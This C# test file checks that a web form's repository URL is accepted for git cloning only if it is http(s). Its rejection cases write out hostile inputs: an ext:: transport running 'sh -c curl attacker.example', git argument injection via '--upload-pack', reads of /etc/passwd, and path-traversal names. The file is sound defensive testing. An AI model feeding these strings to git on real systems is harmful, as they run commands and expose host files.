using Microsoft.Extensions.Logging.Abstractions;
using LegacyLens.Api.Ingestion;

namespace LegacyLens.Tests;

/// <summary>
/// A URL typed into a web form is handed to git, and git understands more than
/// http. These are the checks that keep a form field from becoming a way to run
/// commands or read the host's disk.
/// </summary>
public class CloningTests
{
    [Theory]
    [InlineData("https://github.com/dotnet/runtime.git")]
    [InlineData("https://gitlab.com/group/project")]
    [InlineData("http://internal.example/repo.git")]
    public void An_http_url_is_something_git_can_be_handed(string url)
    {
        Assert.True(Cloning.IsAcceptable(url));
    }

    [Theory]
    // Runs an arbitrary command as the transport.
    [InlineData("ext::sh -c 'curl attacker.example'")]
    // Reads the host's disk rather than a remote.
    [InlineData("file:///etc")]
    [InlineData("/etc/passwd")]
    // Would authenticate as the server rather than as the reader.
    [InlineData("ssh://git@github.com/x/y.git")]
    [InlineData("git://github.com/x/y.git")]
    [InlineData("")]
    [InlineData("not a url")]
    // Argument injection: git reads a leading dash as a flag, not a remote.
    [InlineData("--upload-pack=touch /tmp/pwned")]
    public void Anything_else_is_refused(string url)
    {
        Assert.False(Cloning.IsAcceptable(url));
    }

    [Fact]
    public void The_folder_is_named_for_the_repository()
    {
        var folder = Cloning.FolderFor("https://github.com/dotnet/runtime.git", "abc123");

        Assert.StartsWith("runtime", folder);
        Assert.EndsWith("abc123", folder);
    }

    [Fact]
    public void Two_workspaces_on_one_repository_get_two_folders()
    {
        // Otherwise the second clone lands on the first, and the check that the
        // target is empty turns adding a workspace into an error.
        Assert.NotEqual(
            Cloning.FolderFor("https://github.com/dotnet/runtime.git", "aaa"),
            Cloning.FolderFor("https://github.com/dotnet/runtime.git", "bbb"));
    }

    [Theory]
    [InlineData("https://example.com/../../etc")]
    [InlineData("https://example.com/a%2Fb")]
    [InlineData("https://example.com/..")]
    public void A_repository_name_cannot_climb_out_of_the_folder_it_belongs_in(string url)
    {
        var folder = Cloning.FolderFor(url, "abc123");

        Assert.DoesNotContain("..", folder);
        Assert.DoesNotContain("/", folder);
        Assert.DoesNotContain("\\", folder);
        Assert.Equal(folder, Path.GetFileName(folder));
    }

    [Fact]
    public async Task A_url_git_should_never_see_is_refused_before_git_runs()
    {
        var into = Path.Combine(Path.GetTempPath(), $"lens-clone-{Guid.NewGuid():N}");

        var result = await new Cloning(NullLogger<Cloning>.Instance)
            .CloneAsync("ext::sh -c 'touch /tmp/pwned'", into, token: null);

        Assert.False(result.Ok);
        Assert.Contains("http", result.Error);
        Assert.False(Directory.Exists(into));
    }
}
